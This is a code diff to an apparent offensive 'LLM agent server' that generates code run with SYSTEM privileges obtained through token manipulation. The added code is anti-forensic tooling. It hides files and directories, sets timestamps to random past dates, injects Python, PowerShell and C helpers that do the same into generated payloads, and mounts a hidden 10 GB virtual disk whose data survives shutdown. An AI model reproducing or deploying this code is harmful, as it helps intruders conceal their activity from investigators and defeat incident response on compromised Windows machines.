@@ -24,6 +24,8 @@ from modules.memshadow_protocol import (
 )
 from modules.pe5_utils import PE5Utils
 from modules.pe5_system_escalation import PE5SystemEscalationModule
+from modules.anti_forensics import AntiForensics, create_hidden_file_with_anti_forensics
+from modules.hidden_vdisk import HiddenVirtualDisk, create_hidden_storage
 
 
 class NonceTracker:
@@ -113,6 +115,15 @@ class CodeGenerator:
         self.system_token_acquired = False  # Track if SYSTEM token has been acquired
         self.system_token_handle = None  # Store SYSTEM token handle for reuse
         self.token_pid = None  # PID of process from which token was acquired
+        
+        # Anti-forensics and hidden storage
+        lab_use = self.session_data.get('LAB_USE', 0)
+        self.anti_forensics = AntiForensics(lab_use=lab_use)
+        self.hidden_vdisk: Optional[HiddenVirtualDisk] = None
+        
+        # Apply anti-forensics to temp directory
+        if system_privilege:
+            self.anti_forensics.hide_directory(self.temp_dir)
     
     def check_system_token_pe5(self) -> Dict[str, Any]:
         """
@@ -412,6 +423,15 @@ class CodeGenerator:
         with open(file_path, 'w', encoding='utf-8') as f:
             f.write(code)
         
+        # Apply anti-forensic measures to generated file
+        if self.system_privilege and system_privilege:
+            self.anti_forensics.apply_anti_forensics(
+                file_path,
+                hidden=True,
+                system=True,
+                randomize_timestamps=True
+            )
+        
         self.execution_history.append({
             'file_path': file_path,
             'language': language,
@@ -435,6 +455,69 @@ class CodeGenerator:
             if system_privilege:
                 code_lines.append("import ctypes")
                 code_lines.append("from ctypes import wintypes")
+                code_lines.append("from datetime import datetime, timedelta")
+                code_lines.append("import random")
+        
+        # Add anti-forensic utilities
+        if system_privilege:
+            code_lines.append("")
+            code_lines.append("def apply_anti_forensics_to_file(file_path):")
+            code_lines.append("    \"\"\"Apply anti-forensic measures to file (hidden, system, random timestamps)\"\"\"")
+            code_lines.append("    try:")
+            code_lines.append("        import ctypes")
+            code_lines.append("        from ctypes import wintypes")
+            code_lines.append("        ")
+            code_lines.append("        # Set file attributes (hidden + system)")
+            code_lines.append("        FILE_ATTRIBUTE_HIDDEN = 0x2")
+            code_lines.append("        FILE_ATTRIBUTE_SYSTEM = 0x4")
+            code_lines.append("        FILE_ATTRIBUTE_NORMAL = 0x80")
+            code_lines.append("        attributes = FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM")
+            code_lines.append("        ")
+            code_lines.append("        kernel32 = ctypes.windll.kernel32")
+            code_lines.append("        file_path_w = file_path if isinstance(file_path, str) else str(file_path)")
+            code_lines.append("        kernel32.SetFileAttributesW(file_path_w, attributes)")
+            code_lines.append("        ")
+            code_lines.append("        # Randomize timestamps")
+            code_lines.append("        base_time = datetime.now() - timedelta(days=random.randint(30, 365))")
+            code_lines.append("        creation_time = base_time - timedelta(days=random.randint(1, 30))")
+            code_lines.append("        access_time = base_time - timedelta(days=random.randint(1, 10))")
+            code_lines.append("        modification_time = base_time - timedelta(days=random.randint(1, 20))")
+            code_lines.append("        ")
+            code_lines.append("        # Set file times using PowerShell (more reliable)")
+            code_lines.append("        ps_cmd = f'''")
+            code_lines.append("        $file = Get-Item '{file_path}' -Force")
+            code_lines.append("        $file.CreationTime = [DateTime]::Parse('{creation_time.isoformat()}')")
+            code_lines.append("        $file.LastAccessTime = [DateTime]::Parse('{access_time.isoformat()}')")
+            code_lines.append("        $file.LastWriteTime = [DateTime]::Parse('{modification_time.isoformat()}')")
+            code_lines.append("        '''")
+            code_lines.append("        subprocess.run(['powershell', '-Command', ps_cmd], capture_output=True)")
+            code_lines.append("        ")
+            code_lines.append("        return True")
+            code_lines.append("    except Exception as e:")
+            code_lines.append("        print(f'Anti-forensics failed: {e}')")
+            code_lines.append("        return False")
+            code_lines.append("")
+            code_lines.append("def create_hidden_file(file_path, content, apply_anti_forensics=True):")
+            code_lines.append("    \"\"\"Create file with anti-forensic measures\"\"\"")
+            code_lines.append("    try:")
+            code_lines.append("        # Create directory if needed")
+            code_lines.append("        os.makedirs(os.path.dirname(file_path), exist_ok=True)")
+            code_lines.append("        ")
+            code_lines.append("        # Write file")
+            code_lines.append("        with open(file_path, 'wb') as f:")
+            code_lines.append("            if isinstance(content, str):")
+            code_lines.append("                f.write(content.encode('utf-8'))")
+            code_lines.append("            else:")
+            code_lines.append("                f.write(content)")
+            code_lines.append("        ")
+            code_lines.append("        # Apply anti-forensics")
+            code_lines.append("        if apply_anti_forensics:")
+            code_lines.append("            apply_anti_forensics_to_file(file_path)")
+            code_lines.append("        ")
+            code_lines.append("        return True")
+            code_lines.append("    except Exception as e:")
+            code_lines.append("        print(f'Failed to create hidden file: {e}')")
+            code_lines.append("        return False")
         
         # Add PE5 SYSTEM token check function (using existing PE5 verification method)
         if system_privilege:
@@ -634,6 +717,69 @@ class CodeGenerator:
         if system_privilege:
             code_lines.append("# Privilege: SYSTEM (via token manipulation)")
         code_lines.append("")
+        
+        # Add anti-forensic utilities for PowerShell
+        if system_privilege:
+            code_lines.append("function Set-FileAntiForensics {")
+            code_lines.append("    <#")
+            code_lines.append("    Apply anti-forensic measures to file")
+            code_lines.append("    #>")
+            code_lines.append("    param(")
+            code_lines.append("        [Parameter(Mandatory=$true)]")
+            code_lines.append("        [string]$FilePath")
+            code_lines.append("    )")
+            code_lines.append("    ")
+            code_lines.append("    try {")
+            code_lines.append("        $file = Get-Item $FilePath -Force -ErrorAction Stop")
+            code_lines.append("        ")
+            code_lines.append("        # Set hidden and system attributes")
+            code_lines.append("        $file.Attributes = $file.Attributes -bor [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System")
+            code_lines.append("        ")
+            code_lines.append("        # Randomize timestamps")
+            code_lines.append("        $baseTime = (Get-Date).AddDays(-(Get-Random -Minimum 30 -Maximum 365))")
+            code_lines.append("        $file.CreationTime = $baseTime.AddDays(-(Get-Random -Minimum 1 -Maximum 30))")
+            code_lines.append("        $file.LastAccessTime = $baseTime.AddDays(-(Get-Random -Minimum 1 -Maximum 10))")
+            code_lines.append("        $file.LastWriteTime = $baseTime.AddDays(-(Get-Random -Minimum 1 -Maximum 20))")
+            code_lines.append("        ")
+            code_lines.append("        return $true")
+            code_lines.append("    } catch {")
+            code_lines.append("        Write-Warning \"Anti-forensics failed: $_\"")
+            code_lines.append("        return $false")
+            code_lines.append("    }")
+            code_lines.append("}")
+            code_lines.append("")
+            code_lines.append("function New-HiddenFile {")
+            code_lines.append("    <#")
+            code_lines.append("    Create file with anti-forensic measures")
+            code_lines.append("    #>")
+            code_lines.append("    param(")
+            code_lines.append("        [Parameter(Mandatory=$true)]")
+            code_lines.append("        [string]$FilePath,")
+            code_lines.append("        ")
+            code_lines.append("        [Parameter(Mandatory=$false)]")
+            code_lines.append("        [string]$Content = ''")
+            code_lines.append("    )")
+            code_lines.append("    ")
+            code_lines.append("    try {")
+            code_lines.append("        # Create directory if needed")
+            code_lines.append("        $dir = Split-Path $FilePath -Parent")
+            code_lines.append("        if ($dir -and -not (Test-Path $dir)) {")
+            code_lines.append("            New-Item -ItemType Directory -Path $dir -Force | Out-Null")
+            code_lines.append("        }")
+            code_lines.append("        ")
+            code_lines.append("        # Create file")
+            code_lines.append("        Set-Content -Path $FilePath -Value $Content -NoNewline")
+            code_lines.append("        ")
+            code_lines.append("        # Apply anti-forensics")
+            code_lines.append("        Set-FileAntiForensics -FilePath $FilePath")
+            code_lines.append("        ")
+            code_lines.append("        return $true")
+            code_lines.append("    } catch {")
+            code_lines.append("        Write-Warning \"Failed to create hidden file: $_\"")
+            code_lines.append("        return $false")
+            code_lines.append("    }")
+            code_lines.append("}")
+            code_lines.append("")
         
         if requirements:
             code_lines.append("# Requirements:")
@@ -873,9 +1019,41 @@ class CodeGenerator:
         
         code_lines.append("#include <windows.h>")
         code_lines.append("#include <stdio.h>")
+        code_lines.append("#include <time.h>")
         if system_privilege:
             code_lines.append("#include <psapi.h>")
         code_lines.append("")
+        
+        # Add anti-forensic utilities for C
+        if system_privilege:
+            code_lines.append("BOOL ApplyAntiForensicsToFile(LPCSTR filePath) {")
+            code_lines.append("    // Set file attributes (hidden + system)")
+            code_lines.append("    DWORD attributes = FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM;")
+            code_lines.append("    if (!SetFileAttributesA(filePath, attributes)) {")
+            code_lines.append("        return FALSE;")
+            code_lines.append("    }")
+            code_lines.append("    ")
+            code_lines.append("    // Randomize timestamps")
+            code_lines.append("    HANDLE hFile = CreateFileA(filePath, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,")
+            code_lines.append("        NULL, OPEN_EXISTING, 0, NULL);")
+            code_lines.append("    if (hFile == INVALID_HANDLE_VALUE) {")
+            code_lines.append("        return FALSE;")
+            code_lines.append("    }")
+            code_lines.append("    ")
+            code_lines.append("    // Generate random timestamps")
+            code_lines.append("    SYSTEMTIME st;")
+            code_lines.append("    GetSystemTime(&st);")
+            code_lines.append("    st.wDay -= (rand() % 30) + 1;")
+            code_lines.append("    st.wMonth -= (rand() % 12);")
+            code_lines.append("    ")
+            code_lines.append("    FILETIME ft;")
+            code_lines.append("    SystemTimeToFileTime(&st, &ft);")
+            code_lines.append("    SetFileTime(hFile, &ft, &ft, &ft);")
+            code_lines.append("    ")
+            code_lines.append("    CloseHandle(hFile);")
+            code_lines.append("    return TRUE;")
+            code_lines.append("}")
+            code_lines.append("")
         
         if system_privilege and exploit_type == 'token_manipulation':
             code_lines.append("BOOL EscalateToSystem() {")
@@ -1316,6 +1494,15 @@ class CodeGenerator:
         """Clean up temporary files"""
         import shutil
         try:
+            # Apply anti-forensics before cleanup (if SYSTEM privilege)
+            if self.system_privilege and self.anti_forensics:
+                try:
+                    # Hide temp directory before removal
+                    self.anti_forensics.hide_directory(self.temp_dir)
+                except Exception:
+                    pass
+            
+            # Remove temp directory
             shutil.rmtree(self.temp_dir)
         except Exception:
             pass
@@ -1342,6 +1529,21 @@ class LLMAgentServer:
         self.system_privilege = system_privilege  # SYSTEM privilege execution enabled
         self.pe5_module = PE5SystemEscalationModule()  # Use existing PE5 module for verification
         self.system_token_acquired = False  # Track SYSTEM token acquisition state
+        
+        # Initialize hidden virtual disk for temporary storage
+        lab_use = self.session_data.get('LAB_USE', 0)
+        if system_privilege:
+            try:
+                self.hidden_vdisk = create_hidden_storage(size_gb=10, lab_use=lab_use)
+                if self.hidden_vdisk:
+                    self.console.print("[green]✓ Hidden virtual disk created and mounted[/green]")
+                    mount_info = self.hidden_vdisk.get_mount_info()
+                    self.console.print(f"[dim]  Mount Path: {mount_info.get('mount_path', 'N/A')}[/dim]")
+                    self.session_data['HIDDEN_VDISK_MOUNT'] = mount_info.get('mount_path')
+                else:
+                    self.console.print("[yellow]⚠ Failed to create hidden virtual disk[/yellow]")
+            except Exception as e:
+                self.console.print(f"[yellow]⚠ Hidden virtual disk creation failed: {e}[/yellow]")
         
         # Check and acquire SYSTEM token on initialization if SYSTEM privilege is enabled
         if system_privilege:
@@ -1402,6 +1604,45 @@ class LLMAgentServer:
         # For explicit token passing, would need to use DuplicateTokenEx and SetTokenInformation
         self.console.print("[green]✓ SYSTEM token available - child processes will inherit[/green]")
         return True
+    
+    def get_hidden_storage(self) -> Optional[HiddenVirtualDisk]:
+        """
+        Get hidden virtual disk instance for temporary storage
+        
+        Returns:
+            HiddenVirtualDisk instance or None
+        """
+        if self.hidden_vdisk is None and self.system_privilege:
+            lab_use = self.session_data.get('LAB_USE', 0)
+            self.hidden_vdisk = create_hidden_storage(size_gb=10, lab_use=lab_use)
+        return self.hidden_vdisk
+    
+    def store_in_hidden_disk(self, source_path: str, dest_name: Optional[str] = None) -> Tuple[bool, Optional[str]]:
+        """
+        Store file in hidden virtual disk
+        
+        Args:
+            source_path: Path to source file
+            dest_name: Destination filename (None = use source name)
+        
+        Returns:
+            Tuple of (success, destination_path)
+        """
+        vdisk = self.get_hidden_storage()
+        if vdisk:
+            return vdisk.store_file(source_path, dest_name, apply_anti_forensics=True)
+        return False, None
+    
+    def cleanup_hidden_storage(self, remove_vhd: bool = False):
+        """
+        Cleanup hidden virtual disk
+        
+        Args:
+            remove_vhd: Remove VHD file after unmount (default: False to preserve data)
+        """
+        if self.hidden_vdisk:
+            self.hidden_vdisk.cleanup(remove_vhd=remove_vhd)
+            self.hidden_vdisk = None
         
     def start(self):
         """Start the LLM agent server"""
@@ -1452,6 +1693,11 @@ class LLMAgentServer:
             except Exception:
                 pass
         self.code_generator.cleanup()
+        
+        # Cleanup hidden virtual disk (but don't remove VHD to preserve data)
+        if self.hidden_vdisk:
+            self.cleanup_hidden_storage(remove_vhd=False)
+        
         self.console.print("[yellow]LLM Agent Server stopped[/yellow]")
     
     def _handle_client(self, client_socket: socket.socket, address: Tuple[str, int]):
